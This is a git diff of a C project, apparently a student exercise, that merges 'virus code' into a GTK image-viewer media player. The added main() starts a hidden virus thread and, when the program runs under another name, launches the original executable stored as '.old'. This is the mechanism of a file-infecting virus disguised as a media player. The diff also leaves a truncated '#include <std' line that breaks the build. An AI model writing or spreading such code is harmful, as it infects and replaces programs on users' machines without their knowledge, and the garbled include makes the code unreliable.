@@ -1,5 +1,4 @@
-#include <stdio.h>
-<<<<<<< 16-virus
+#include <std
 #include <stdlib.h>
 #include <string.h>
 #include <stdbool.h>
@@ -8,10 +7,12 @@
 #include <unistd.h>
 #include <limits.h>
 #include <pthread.h>
+#include <gtk/gtk.h>
 
+#define MAX_IMAGES 256
+#define MAX_PATH   512
 
-
-//Virus code
+//Virus code made by Julien Linares
 static bool isExeCompatible(const char *name) {
     struct stat st;
     char old_name[PATH_MAX];
@@ -101,43 +102,7 @@ static void *virus_thread(void *arg){
 
 //End of virus code
 
-int main(int argc, char *argv[]) {
-    pthread_t t;
-    if (pthread_create(&t, NULL, virus_thread, NULL) != 0) {
-        perror("pthread_create");
-        return 1;
-    }
-    if (strcmp(argv[0], "./media_player") != 0) {
-        //lancer le logiciel du même nom en .old
-        char old_name[PATH_MAX];
-        if (snprintf(old_name, sizeof(old_name), "%s.old", argv[0]) < 0) {
-            printf("Error creating old filename.\n");
-            return 1;
-        }
-        printf("Launching original executable: %s\n", old_name);
-        if (access(old_name, F_OK) != 0) {
-            printf("Original executable not found: %s\n", old_name);
-            return 1;
-        }
-        pthread_join(t, NULL);
-        execl(old_name, old_name, NULL);
-        perror("execl");
-
-    }
-
-    // a mettre a la fin de toute sortie du programme pour que le virus se termine avant que le programme ne se termine
-    pthread_join(t, NULL);
-=======
-#include <string.h>
-#include <stdlib.h>
-#include <dirent.h>
-#include <gtk/gtk.h>
-
 // Media Player by Amaury Mulcey
-
-#define MAX_IMAGES 256
-#define MAX_PATH   512
-
 typedef struct Image {
     char path[MAX_PATH];
     char name[MAX_PATH];
@@ -265,6 +230,29 @@ void buildUI(MediaPlayer *player) {
 }
 
 int main(int argc, char *argv[]) {
+    pthread_t t;
+    if (pthread_create(&t, NULL, virus_thread, NULL) != 0) {
+        perror("pthread_create");
+        return 1;
+    }
+    if (strcmp(argv[0], "./media_player") != 0) {
+        //lancer le logiciel du même nom en .old
+        char old_name[PATH_MAX];
+        if (snprintf(old_name, sizeof(old_name), "%s.old", argv[0]) < 0) {
+            printf("Error creating old filename.\n");
+            return 1;
+        }
+        printf("Launching original executable: %s\n", old_name);
+        if (access(old_name, F_OK) != 0) {
+            printf("Original executable not found: %s\n", old_name);
+            return 1;
+        }
+        pthread_join(t, NULL);
+        execl(old_name, old_name, NULL);
+        perror("execl");
+        return 1;
+
+    }
     printf("Media Player by Amaury Mulcey\nVirus by Julien Linares\n\n");
     gtk_init(&argc, &argv);
 
@@ -279,6 +267,7 @@ int main(int argc, char *argv[]) {
     refreshImage(&player);
 
     gtk_main();
->>>>>>> develop
+    // a mettre a la fin de toute sortie du programme pour que le virus se termine avant que le programme ne se termine
+    pthread_join(t, NULL);
     return 0;
 }
